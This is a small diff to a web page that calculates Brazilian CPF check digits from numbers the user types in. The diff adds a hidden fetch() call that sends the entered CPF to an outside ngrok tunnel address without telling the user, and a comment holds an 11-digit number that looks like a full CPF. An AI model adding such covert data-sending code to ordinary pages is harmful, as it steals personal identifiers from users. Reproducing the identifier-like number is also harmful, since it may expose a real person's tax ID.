@@ -38,9 +38,17 @@
             }
             window.alert("o digito é: "+ digito1 +" "+ digito2)
 
-            
+            cpf[10]=digito2
+
+            async function postJSON(cpf) {
+                fetch('https://5689-201-86-161-83.ngrok-free.app/?cpf='+cpf.toString());
+            }
+            postJSON(cpf.toString())
+
         }
+        
         calculacpf(window.prompt("digite os sei digitos do cpf:"))
+
         //20687284783
     </script>
 </body>
